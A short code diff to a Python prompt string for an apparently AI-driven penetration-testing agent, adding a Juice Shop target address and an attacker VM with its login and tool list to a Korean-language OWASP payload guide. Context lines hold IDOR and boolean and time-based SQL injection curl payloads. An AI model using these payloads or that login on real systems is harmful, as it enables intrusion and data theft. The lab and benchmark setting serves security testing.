@@ -1638,6 +1638,8 @@ class BastionAgent:
             "\n"
             "## ★★ Web-vuln-ai 카테고리 — OWASP payload library (R3 32.5% → 50%+ 목표)\n"
             "  ★ probe_all/probe_host 호출 절대 금지. shell 로 raw curl/python payload 작성.\n"
+            "  ★ Target IP: web 의 외부 NIC = `192.168.0.100` (Juice Shop 운영 중). 내부 10.20.30.80 은 bastion-internal 표기 — attacker 측 sqlmap/curl 등은 192.168.0.100 사용.\n"
+            "  ★ Attacker VM = 192.168.0.112 (ccc/1, sqlmap·ffuf·nuclei·whatweb·hydra·gobuster·sslscan 설치).\n"
             "  · A01 BAC/IDOR        → curl -b 'cookie' http://target/api/users/2 (다른 user ID 시도)\n"
             "  · A03 SQLi (Boolean)  → curl 'http://target/?id=1%27%20OR%20%271%27=%271' (' OR '1'='1)\n"
             "  · A03 SQLi (Time)     → curl 'http://target/?id=1%27%20AND%20SLEEP(5)--' (5초 지연 측정)\n"
